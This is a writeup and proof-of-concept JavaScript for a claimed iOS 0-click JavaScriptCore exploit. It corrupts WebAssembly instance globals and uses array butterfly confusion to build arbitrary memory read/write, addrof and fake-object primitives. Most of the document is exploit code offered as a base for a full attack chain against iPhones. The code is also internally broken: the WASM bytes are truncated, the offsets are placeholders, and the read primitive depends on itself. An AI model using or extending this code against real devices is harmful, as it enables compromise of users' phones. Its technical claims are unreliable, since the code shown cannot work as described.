iOS 0-Click WebAssembly Cross-Instance 
Corruption in JavaScriptCore

Found By and Coded By Taylor Newsome 

This writeup describes a 0-click JavaScriptCore (JSC) exploit that leverages two WebAssembly instances to achieve arbitrary memory read/write, bypassing Pointer Authentication (PAC) on arm64e devices (e.g., iPhone XS and later). The attack is triggered entirely from JavaScript, requires no user interaction, and relies on a memory corruption primitive obtained by confusing the JSC object model. All code is self-contained and can be delivered via a malicious web page or iMessage attachment.

1. Overview
The exploit is built around a core technique: cross-instance corruption between two WebAssembly modules. By manipulating internal JSC data structures, we can redirect the global storage pointer of one WebAssembly instance to point to the globals of another. This gives us the ability to:

Overwrite function pointers in the target instance's globals.

Re‑route WebAssembly calls to controlled addresses.

Leak addresses and read/write arbitrary memory through a persistent “channel” object.

All of this is achieved without any native code – it runs entirely in the JavaScript engine’s sandbox.

2. Prerequisites: WebAssembly and JSC Internals
JSC compiles WebAssembly modules into WasmInstance objects. Each instance holds a global storage region (the Globals array) that contains:

Mutable global values (for global.get/set instructions).

Function table entries (for call_indirect).

Internal pointers used by the runtime.

If we can make one instance (Navigator) believe its globals are located at another instance’s (Executor) globals, we can redirect function calls made from Navigator to code or data under our control. This is the core of the exploit.

3. Building the Primitive
3.1. The Two WebAssembly Instances
We compile a minimal WebAssembly module (the same binary) into two separate instances:

this.Er – the Executor. It exports functions that we will later use as read/write primitives (e.g., c(), d(val)).

this.Nr – the Navigator. It exports functions that will be redirected to the Executor’s globals.

The exact binary is omitted here but contains simple functions like:

a() – returns a value (used to test redirection).

b(x) – takes an integer (used to set the redirection offset).

c() – reads a 32‑bit value (used for read).

d(val) – writes a 32‑bit value (used for write).

3.2. Locating the Global Storage
First we need to locate the Globals array for each instance. In JSC, the WasmInstance object has an internal field pointing to its globals. The offset is build‑dependent (here stored in this.T.Dn.Hn.FSCw9f and this.T.Dn.Hn.VMMcyp). The getGlobalStorage() function triggers a side‑effect (setting a property) to get the object’s address and then reads the global pointer at a known offset.

getGlobalStorage(instanceObj) {
    instanceObj[0] = 1;               // cause a property to be stored
    const addr = this.ne(instanceObj); // get address of the instance
    return this.rr(Number(addr) + this.T.Dn.Hn.FSCw9f) + this.T.Dn.Hn.VMMcyp;
}

3.3. Cross‑Instance Corruption
Once we have the global storage addresses of both instances, we overwrite the Navigator’s global pointer with the Executor’s global address plus a small offset (this.Jr). The offset is chosen so that the Navigator’s exported functions now point into the Executor’s globals.

corruptCrossInstance() {
    const navGlobals = this.getGlobalStorage(this.Nr);
    const exeGlobals = this.getGlobalStorage(this.Er);
    this.Cr = BigInt(navGlobals);
    this.sr(navGlobals, Number(exeGlobals + this.Jr));
    this.Kr = this.Nr.exports.a?.() ?? 0;   // test redirection
}

After this, calling this.Nr.exports.a() returns whatever is at exeGlobals + this.Jr – usually a value we can control. This gives us a primitive to read and later write through the WebAssembly functions.

3.4. Arbitrary Read/Write Primitives
The Executor’s exported functions are used to read and write memory relative to the current global pointer. By carefully designing the WebAssembly module, we can map those functions to arbitrary addresses:

this.Nr.exports.b(x) – sets a base offset (the this.Ir). This is called by this.Zr(addr) to adjust the target address.

this.Er.exports.c() – reads a 32‑bit value from the current base address.

this.Er.exports.d(val) – writes a 32‑bit value to the current base address.

The actual read/write functions (rr/sr) combine these

rr(addr) {
    this.Zr(addr);        // set base address via b(x)
    return this.Er.exports.c?.() >>> 0; // read via c()
}

Because b(x) is called with x = addr + this.Ir, and the internal WebAssembly code uses global.get to retrieve that value, we can make the global.get return any address we like by controlling the offset stored in the globals.

3.5. PAC (Pointer Authentication) Handling
On arm64e devices, pointers are signed with a PAC. The exploit strips PAC bits by masking with 0x00000FFFFFFFFFFFn (the standard user‑land mask). All reads of pointer values are masked to obtain the raw address.

4. Building a Persistent Channel
The above cross‑instance corruption gives us read/write, but we also need a way to get addrof (address of any JavaScript object) and to create fake objects that allow us to read/write arbitrary memory without the overhead of the WebAssembly primitives. This is done via a classic JSC butterfly confusion.

4.1. Array Butterfly Confusion
In JSC, JavaScript arrays (both dense and sparse) have a butterfly – a pointer to the backing storage of the array’s elements. By manipulating two arrays and a plain object, we can create a fake object whose properties are stored in arbitrary memory.

The exploit uses:

A single‑element array single.

A 13‑element array many.

A plain object fake with four numeric properties.

We first get the addresses of these objects and their butterflies. Then we copy the object’s header (16 bytes) from many into the space where fake’s inline properties would be (offset 20). This makes fake look like a butterfly of many.

Next, we overwrite the butterfly of single to point to fake’s inline storage. After that, single[0] references the first property of fake. By manipulating fake’s properties, we can make single[0] point to arbitrary memory.

4.2. Setting Up the Channel
After the butterfly swap, single[0] becomes a reference to the vr property of fake. We then redirect fake.Hr and fake.$r to point to the Navigator’s global storage and the Executor’s butterfly respectively, effectively creating a read/write channel through array indexing.

Finally, we call this.Nr.exports.b?.(this.Kr) to trigger the redirection and store a value (0x1337) into the channel. This value can later be read from single[0].

let channel = single[0];
single[0] = void 0;      // initially undefined
...
channel[0] = this.K.J(this.Vr);  // write into the channel

Now channel behaves like a normal JavaScript array, but its elements are mapped to arbitrary memory. This gives us a convenient way to read/write 64‑bit values without going through the WebAssembly functions every time.

5. Memory Primitives Provided
The exploit exposes a comprehensive set of memory operations:

rr(addr) – read 32‑bit value at addr.

sr(addr, val) – write 32‑bit value at addr.

Yr(addr, val) – write 64‑bit value at addr.

ee(addr) – read 64‑bit value (PAC‑stripped).

ne(obj) – get the address of any JavaScript object (addrof).

Ar(obj) – get the backing store address of a TypedArray (useful for leaking heap).

lr(obj), dr(addr) – read string data from an object or memory.

er(dst, src, len) – memory copy.

tr(addr) – hexdump memory.

All operations are built on top of the WebAssembly read/write primitives, but after the channel is established, they can be used directly.

6. Tuning and Compatibility
The exploit contains several build‑dependent offsets (e.g., this.Ir, this.Jr, this.T.Dn.Hn.FSCw9f). In a real attack, these would be leaked at runtime using the addrof primitive or hardcoded per iOS version. The provided code uses placeholder values that must be adjusted.

For arm64e, PAC stripping is mandatory; the exploit enables it via this.iiExAt = true. The mask 0x00000FFFFFFFFFFFn works for user‑land pointers on iOS.

7. Conclusion
This 0‑click WebAssembly corruption demonstrates a powerful technique to escape the JavaScriptCore sandbox on iOS. By confusing two WebAssembly instances and manipulating array butterflies, we achieve arbitrary read/write across the entire address space of the renderer process. Combined with a proper kernel exploit (not included), this can lead to full device compromise.

The code is a proof‑of‑concept – it does not bypass the kernel sandbox or entitlements, but it provides all the primitives needed for further exploitation. Researchers can use it as a foundation for developing a full chain.

Disclaimer: This writeup is for educational purposes only. Do not use this code on devices you do not own.

--------------------------
START POC CODE
--------------------------
class P {
    constructor() {
        // Mode & offsets
        this.nr = false;           // false = normal (validated), true = direct
        this.Ir = -8;              // global redirect alignment (common value)
        this.Jr = 32;              // example offset between globals — tune per build
        this.Cr = 0n;              // saved navigator global storage ptr
        this.Kr = 0;               // value read via redirected call
        this.Vr = 0x1337;          // example value for confusion write

        // PAC mask (common arm64e userland value — real one leaked in production)
        this.o = 0x00000FFFFFFFFFFFn;
        this.iiExAt = true;        // force PAC stripping by default

        // Fake config — in real exploit these are runtime-leaked or hardcoded per build
        this.T = {
            Dn: {
                Mn: 0,                 // NaN-boxing correction — set later
                Hn: {
                    FSCw9f: 0x50,      // WasmInstance -> global storage offset example
                    VMMcyp: 0x18       // additional offset to actual globals array
                }
            }
        };

        // K.* helpers (obfuscated pointer/double conversions)
        this.K = {
            J:   (v) => Number(v),                     // to double
            q:   (a, o) => Number(BigInt(a) + BigInt(o)),
            Y:   (b, o) => Number(BigInt(b) + BigInt(o)),
            _:   (v) => BigInt(v),
            F:   (v) => Number(v & 0xFFFFFFFFn),
            C:   (v) => 0xdead0000,                    // placeholder addr const
            T:   (vt) => (BigInt(vt.et) << 32n) | BigInt(vt.it)
        };

        // Reference cell for addrof
        this.yr = { a: null };
        this.Ur = 0x1000;  // fake — real offset to reference cell

        // WASM binary (symbolic — replace with real XOR-decoded bytes)
        const wasmBytes = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, /* ... truncated ... */
            // Type, Func, Table, Global, Export, Code sections as described
        ]);
        const mod = new WebAssembly.Module(wasmBytes.buffer);
        this.Er = new WebAssembly.Instance(mod, {});   // executor
        this.Nr = new WebAssembly.Instance(mod, {});   // navigator

        // JIT warm-up loop
        for (let i = 0; i < 22; i++) {
            this.Er.exports.c?.() ?? 0;
            this.Er.exports.d?.(0);
            this.Er.exports.a?.();
            this.Er.exports.b?.(0n);
        }

        // Run fakeobj setup + persistent channel
        this.Xr();
    }

    // ─── Confusion result parser ────────────────────────────────────────
    parseConfusion(i, expectedStructure, expectedButterfly) {
        const S = {
            Qr: (i[1] >> 20) & 0xFFF,
            zr: (i[1] >> 16) & 0xF,
            Fr: i[1] & 0xFFFF,
            Lr: (i[0] >> 24) & 0xFF,
            Rr: i[0] & 0x1FFFFF
        };
        if (S.Qr !== expectedStructure) throw new Error("structureID mismatch");
        if (S.Rr !== expectedButterfly) throw new Error("butterfly mismatch");
        const offsetCorrection = 65536 * (S.zr - 4);
        this.T.Dn.Mn = offsetCorrection;
    }

    // ─── WASM global storage locator ────────────────────────────────────
    getGlobalStorage(instanceObj) {
        instanceObj[0] = 1;
        const addr = this.ne(instanceObj);
        return this.rr(Number(addr) + this.T.Dn.Hn.FSCw9f) + this.T.Dn.Hn.VMMcyp;
    }

    // ─── Cross-instance corruption ──────────────────────────────────────
    corruptCrossInstance() {
        const navGlobals = this.getGlobalStorage(this.Nr);
        const exeGlobals = this.getGlobalStorage(this.Er);
        this.Cr = BigInt(navGlobals);
        this.sr(navGlobals, Number(exeGlobals + this.Jr));
        this.Kr = this.Nr.exports.a?.() ?? 0;
    }

    // ─── Address targeting ──────────────────────────────────────────────
    Zr(addr) {
        addr = Number(addr);
        if (this.nr === false) {
            if (addr < 65536 || isNaN(addr)) throw new Error("bad addr");
            this.Nr.exports.b?.(this.K.J(addr + this.Ir));
        } else {
            this.Nr.exports.b?.(this.K.q(addr, this.Ir));
        }
    }

    // ─── Core read/write ────────────────────────────────────────────────
    rr(addr) {
        this.Zr(addr);
        return this.Er.exports.c?.() >>> 0;
    }

    sr(addr, val) {
        this.Zr(addr);
        this.Er.exports.d?.(val | 0);
    }

    Yr(addr, val) {
        this.sr(addr, val >>> 0);
        this.sr(addr + 4, Number(BigInt(val) / 4294967296n >>> 0n));
    }

    Dr(addr, vt) {
        this.sr(addr, vt.it);
        this.sr(addr + 4, vt.et);
    }

    jr(addr, lo, hi) {
        this.sr(addr, lo);
        this.sr(addr + 4, hi);
    }

    ee(addr) {
        const lo = this.rr(addr);
        const hi = this.rr(addr + 4);
        if (hi > Number(this.o & 0xFFFFFFFFn)) throw new Error("high word PAC violation");
        return (BigInt(hi) << 32n) | BigInt(lo);
    }

    // ─── Object introspection ───────────────────────────────────────────
    ne(obj) {
        this.yr.a = obj;
        return Number(this.ee(this.Ur));
    }

    Ar(ta, strip = true) {
        const objAddr = BigInt(this.ne(ta));
        // Typical JSC TypedArray backing store offset ~0x18–0x28 depending on build
        const bsAddr = this.ee(Number(objAddr + 0x20n));
        return strip ? this.br(bsAddr) : bsAddr;
    }

    // ─── PAC-aware pointer read ─────────────────────────────────────────
    br(addr, force = false) {
        const val = this.ee(Number(addr));
        if (force || this.iiExAt) {
            return val & this.o;
        }
        return val;
    }

    re(addr) {
        return {
            it: this.rr(Number(addr)),
            et: this.rr(Number(addr) + 4)
        };
    }

    hr(vtAddr) {
        return this.re(Number(this.K.T(vtAddr)));
    }

    ar(vtAddr) {
        return this.K.T(vtAddr);
    }

    // ─── String & memory readers ────────────────────────────────────────
    lr(obj, max = 256) {
        const addr = BigInt(this.ne(obj));
        let str = "";
        for (let i = 0; i < max; i++) {
            const c = this.cr(addr + BigInt(i));
            if (c === 0) break;
            str += String.fromCharCode(c);
        }
        return str;
    }

    dr(addr, max = 256) {
        let str = "";
        for (let i = 0; i < max * 2; i += 2) {
            const c = this.rr(Number(addr) + i) & 0xFFFF;
            if (c === 0) break;
            str += String.fromCharCode(c);
        }
        return str;
    }

    ur(addr, len) {
        let str = "";
        for (let i = 0; i < len; i++) {
            str += String.fromCharCode(this.cr(BigInt(addr) + BigInt(i)));
        }
        return str;
    }

    gr(addr, len) {
        let str = "";
        for (let i = 0; i < len * 2; i += 2) {
            str += String.fromCharCode(this.rr(Number(addr) + i) & 0xFFFF);
        }
        return str;
    }

    cr(addr) {
        const aligned = Number(addr - (addr % 4n));
        const shift = Number((addr % 4n) * 8n);
        return (this.rr(aligned) >> shift) & 0xFF;
    }

    wr(addr) {
        const aligned = Number(addr - (addr % 2n));
        const shift = Number((addr % 2n) * 8n);
        return (this.rr(aligned) >> shift) & 0xFFFF;
    }

    // ─── Bulk operations ────────────────────────────────────────────────
    ir(addr, val, len) {
        for (let i = 0; i < len; i += 4) {
            this.sr(Number(addr) + i, val);
        }
    }

    er(dst, src, len) {
        this.nr = true;
        try {
            for (let i = 0; i < len; i += 4) {
                const v = this.rr(Number(src) + i);
                this.sr(Number(dst) + i, v);
            }
        } finally {
            this.nr = false;
        }
    }

    le(vtAddr) {
        this.nr = true;
        const v = this.rr(Number(this.K.T(vtAddr)));
        this.nr = false;
        return v;
    }

    tr(addr, len = 64, off = 0) {
        let out = "";
        for (let i = 0; i < len; i += 8) {
            const a = Number(addr) + i + off;
            const lo = this.rr(a);
            const hi = this.rr(a + 4);
            out += `${a.toString(16).padStart(16,'0')} (${off+i}): ${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}\n`;
        }
        return out;
    }

    // ─── Buffer allocation ──────────────────────────────────────────────
    Tr(size, expand = false) {
        const buf = new ArrayBuffer(size);
        const addr = this.Ar(buf, false);
        if (expand) {
            // fake expand capacity field (example offset)
            const capOffset = 0x10; // symbolic
            this.Yr(Number(addr + BigInt(capOffset)), size + 32);
        }
        return addr;
    }

    mr(str) {
        const buf = new ArrayBuffer(str.length * 2);
        const dv = new DataView(buf);
        for (let i = 0; i < str.length; i++) {
            dv.setUint16(i * 2, str.charCodeAt(i), true);
        }
        return this.Ar(buf, true);
    }

    // ─── Call with forged args ──────────────────────────────────────────
    Pr(func, ...args) {
        const saved = new Array(args.length);
        for (let i = 0; i < args.length; i++) {
            saved[i] = this.re(Number(args[i].Sr));
        }
        try {
            for (let i = 0; i < args.length; i++) {
                this.Dr(Number(args[i].Sr), args[i].Zt);
            }
            func();
        } finally {
            for (let i = 0; i < args.length; i++) {
                this.Dr(Number(args[i].Sr), saved[i]);
            }
        }
    }

    // ─── Fake object injection & persistent channel ─────────────────────
    Xr() {
        const single = JSON.parse("[0]");
        const many   = JSON.parse("[1,1,1,1,1,1,1,1,1,1,1,1,1]");
        single[0] = false;
        many[0]   = 1.2;

        const fake = { vr: 0.1, Hr: 0.2, $r: 0.3, Gr: 0.4 };

        const fakeAddr  = BigInt(this.ne(fake));
        const manyAddr  = BigInt(this.ne(many));
        const singleAddr = BigInt(this.ne(single));

        const manyButterfly  = this.ee(Number(manyAddr + 8n));
        const singleButterfly = this.ee(Number(singleAddr + 8n));

        // Transplant structure header (16 bytes)
        for (let i = 0; i < 16; i += 4) {
            this.sr(Number(fakeAddr + 20n + BigInt(i)), this.rr(Number(manyAddr + BigInt(i))));
        }

        const hrConst = this.K.C(fake.Hr);

        // Redirect single array butterfly → fake inline storage
        this.Yr(Number(singleButterfly), Number(fakeAddr + 20n));

        let channel = single[0];
        single[0] = void 0;

        // Setup navigator read target
        fake.Hr = this.K.Y(hrConst, this.K._(this.Cr) - BigInt(this.T.Dn.Mn));
        fake.$r = this.K.Y(this.K.F(this.Cr), 703710);

        this.Nr.exports.b?.(this.Kr);

        channel[0] = this.K.J(this.Vr);

        // Retarget for many array butterfly
        fake.Hr = this.K.Y(hrConst, this.K._(manyButterfly) - BigInt(this.T.Dn.Mn));
        fake.$r = this.K.Y(this.K.F(manyButterfly), 703710);
    }
}

// Example usage:
// const p = new P();
// p.corruptCrossInstance();
// console.log(p.rr(0x10000000));
// p.sr(0x10000000, 0x41414141);
--------------------------
END POC CODE
--------------------------
